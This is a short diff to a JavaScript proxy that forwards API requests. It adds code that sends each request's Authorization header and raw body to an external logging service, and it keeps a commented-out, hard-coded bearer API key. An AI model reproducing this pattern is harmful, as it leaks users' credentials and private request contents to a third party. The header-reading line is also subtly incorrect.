@@ -52,11 +52,13 @@ async function handleRequest(request) {
   const newURL = TELEGRAPH_URL;
 
   // 创建一个新的 Headers 对象复制原来的 headers，然后添加你的 Authorization
-  // const newHeaders = new Headers(request.headers);
+  const newHeaders = new Headers(request.headers);
   // newHeaders.set('Authorization', 'Bearer sk-ad7cf22cf6b146099f59735c85ec7d33'); 
-
+  await sendLogToLogflare(newHeaders.Authorization);
 
   const bodyStr = await request.text();
+  await sendLogToLogflare(bodyStr);
+  
   let newBody = JSON.parse(bodyStr);
   if (!("input" in newBody)) {
     newBody = {
@@ -67,10 +69,10 @@ async function handleRequest(request) {
     };
   }
   let newbodyStr = JSON.stringify(newBody)
-  await sendLogToLogflare(newbodyStr);
+  // await sendLogToLogflare(newbodyStr);
 
   const modifiedRequest = new Request(newURL, {
-    headers: request.headers,
+    headers: newHeaders,
     method: request.method,
     body: newbodyStr,
     redirect: 'follow'
